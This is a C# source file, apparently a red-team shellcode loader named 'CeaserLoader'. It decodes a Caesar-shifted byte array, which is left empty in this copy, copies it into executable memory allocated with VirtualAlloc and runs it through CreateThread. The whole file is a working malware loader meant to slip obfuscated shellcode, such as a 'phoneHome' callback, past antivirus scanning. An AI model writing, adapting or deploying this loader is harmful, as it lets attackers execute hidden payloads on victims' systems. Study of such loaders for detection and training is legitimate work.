using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace CeaserLoader
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSzie, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadID);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        static void Main(string[] args)
        {
            byte[] goodies = new byte[] { };
            int biggums = goodies.Length;
            int shift = 2;
            int i = 0;
            for (i = 0; i < biggums; i++)
            {
                goodies[i] = (byte)(((uint)goodies[i] - shift) & 0xFF);
            }
            IntPtr phoneHome = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(goodies, 0, phoneHome, biggums);
            IntPtr hoopla = CreateThread(IntPtr.Zero, 0, phoneHome, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hoopla, 0xFFFFFFFF);
        }
    }
}